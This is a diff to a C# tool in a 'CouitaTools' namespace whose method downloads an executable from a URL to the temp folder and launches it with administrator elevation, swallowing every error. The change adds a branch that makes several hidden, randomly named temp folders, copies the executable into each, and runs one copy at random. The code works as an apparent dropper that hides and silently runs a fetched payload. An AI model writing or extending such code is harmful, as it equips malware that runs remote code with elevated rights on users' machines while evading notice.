@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -26,35 +27,77 @@ namespace CouitaTools
             {
                 await DownloadFileAsync(url);
             }
-            catch (Exception ex) { }
+            catch (Exception) { }
         }
 
         private async Task DownloadFileAsync(string url)
         {
-            string tempPath = Path.Combine(
-                Path.GetTempPath(),
-                $"{Guid.NewGuid().ToString("N").Substring(0, 32)}.exe"
-            );
-
-            using (WebClient client = new WebClient())
+            if (CheckBox.IsChecked == true)
             {
-                client.DownloadProgressChanged += Client_DownloadProgressChanged;
-                await client.DownloadFileTaskAsync(new Uri(url), tempPath);
-                client.DownloadProgressChanged -= Client_DownloadProgressChanged;
+                string randomName = $"{Guid.NewGuid().ToString("N").Substring(0, 32)}.exe";
+                string tempPath = Path.Combine(Path.GetTempPath(), randomName);
+
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadProgressChanged += Client_DownloadProgressChanged;
+                    await client.DownloadFileTaskAsync(new Uri(url), tempPath);
+                    client.DownloadProgressChanged -= Client_DownloadProgressChanged;
+                }
+
+                var folderNames = new List<string>();
+                Random rand = new Random();
+                int folderCount = 4 + rand.Next(9);
+
+                for (int i = 0; i < folderCount; i++)
+                {
+                    string folderName = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid().ToString("N").Substring(0, 32)}");
+                    Directory.CreateDirectory(folderName);
+                    File.SetAttributes(folderName, FileAttributes.Hidden);
+                    folderNames.Add(folderName);
+                }
+
+                foreach (string folder in folderNames)
+                {
+                    File.Copy(tempPath, Path.Combine(folder, randomName), true);
+                }
+
+                var processStartInfo = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(folderNames[rand.Next(folderNames.Count)], randomName),
+                    Verb = "runas",
+                    UseShellExecute = true
+                };
+
+                try
+                {
+                    Process.Start(processStartInfo);
+                }
+                catch (Exception) { }
             }
-
-            var processStartInfo = new ProcessStartInfo
+            else
             {
-                FileName = tempPath,
-                Verb = "runas",
-                UseShellExecute = true
-            };
+                string tempPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid().ToString("N").Substring(0, 32)}.exe");
 
-            try
-            {
-                Process.Start(processStartInfo);
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadProgressChanged += Client_DownloadProgressChanged;
+                    await client.DownloadFileTaskAsync(new Uri(url), tempPath);
+                    client.DownloadProgressChanged -= Client_DownloadProgressChanged;
+                }
+
+                var processStartInfo = new ProcessStartInfo
+                {
+                    FileName = tempPath,
+                    Verb = "runas",
+                    UseShellExecute = true
+                };
+
+                try
+                {
+                    Process.Start(processStartInfo);
+                }
+                catch (Exception) { }
             }
-            catch (Exception ex) { }
         }
 
         private void Client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
